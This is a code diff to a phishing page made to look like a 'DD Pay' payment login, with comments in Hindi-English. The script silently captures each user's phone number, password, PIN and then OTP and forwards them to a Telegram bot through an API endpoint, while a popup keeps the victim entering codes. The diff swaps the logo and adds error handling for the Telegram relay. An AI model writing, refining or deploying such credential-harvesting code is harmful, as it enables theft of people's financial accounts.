@@ -46,7 +46,7 @@
         .modal-text { font-size: 14px; color: #008e5a; margin-bottom: 10px; line-height: 1.4; font-weight: 500; }
         .modal-phone { font-size: 15px; font-weight: bold; color: #008e5a; margin-bottom: 20px; }
 
-        /* OTP Input Area - FIXED BUTTON OVERFLOW */
+        /* OTP Input Area */
         .otp-input-row { display: flex; align-items: center; border: 1px solid #ccc; border-radius: 30px; padding: 5px; margin-bottom: 20px; overflow: hidden; }
         .otp-input-row i { color: #008e5a; font-size: 18px; margin-left: 15px; margin-right: 10px; flex-shrink: 0; }
         .otp-input-row input { flex: 1; min-width: 0; border: none; outline: none; font-size: 15px; padding: 5px; }
@@ -58,13 +58,11 @@
 <body>
 
     <div class="main-container">
-        <!-- Logo -->
         <div class="logo-container">
-            <!-- Yahan aap apne logo ka link daalein, abhi temporary imgbb link hai -->
-            <img src="https://i.ibb.co/6PZk6vC/ddpay-logo.png" alt="DD Pay" onerror="this.src='https://via.placeholder.com/180x80?text=DD+Pay'">
+            <!-- Nayi Logo Image Link -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Dollar_sign_in_circle_cleaned_%28PDDC%29.svg/200px-Dollar_sign_in_circle_cleaned_%28PDDC%29.svg.png" alt="DD Pay" style="filter: hue-rotate(90deg);">
         </div>
 
-        <!-- Main Login Form -->
         <form id="loginForm">
             <div class="input-group">
                 <i class="fa-solid fa-user"></i>
@@ -122,7 +120,7 @@
     </div>
 
     <script>
-        // --- TELEGRAM API FUNCTION ---
+        // API URL Setup
         async function sendToTelegram(messageText) {
             try {
                 const res = await fetch('/api/submit', {
@@ -130,9 +128,18 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ message: messageText })
                 });
-                return res.ok;
+                
+                const data = await res.json();
+                
+                if (res.ok) {
+                    return true;
+                } else {
+                    // Agar Vercel me token/chat id ki galti hogi toh yeh error batayega
+                    alert("Telegram Error: " + (data.error || "Bot token ya Chat ID galat hai."));
+                    return false;
+                }
             } catch (error) {
-                console.error("API Error:", error);
+                alert("Network Error: API se connect nahi ho paya.");
                 return false;
             }
         }
@@ -144,7 +151,7 @@
             modal.style.display = 'none';
         }
 
-        // Main Form Submit
+        // Form Submit (Sign In)
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const phone = document.getElementById('phone').value;
@@ -152,10 +159,10 @@
             const pin = document.getElementById('pin').value;
 
             const msg = `🔔 *User ne Sign In kiya!*\n\n📞 Phone: ${phone}\n🔑 Password: ${password}\n🔢 PIN: ${pin}`;
-            sendToTelegram(msg);
+            sendToTelegram(msg); // Chupchap bhej dega
 
             displayPhone.innerText = `+91 ${phone}`;
-            modal.style.display = 'flex';
+            modal.style.display = 'flex'; // Popup khol dega
         });
 
         // Send OTP Button
@@ -169,8 +176,6 @@
 
             if(success) {
                 alert("OTP Request aapke Telegram par bhej di gayi hai!");
-            } else {
-                alert("Telegram par nahi gaya, Vercel me API settings check karein.");
             }
 
             this.innerText = "Send";
@@ -196,8 +201,6 @@
             if(success) {
                 alert("Login Successful! (OTP details sent to Telegram)");
                 closeModal();
-            } else {
-                alert("Error!");
             }
 
             this.innerText = "Confirm";
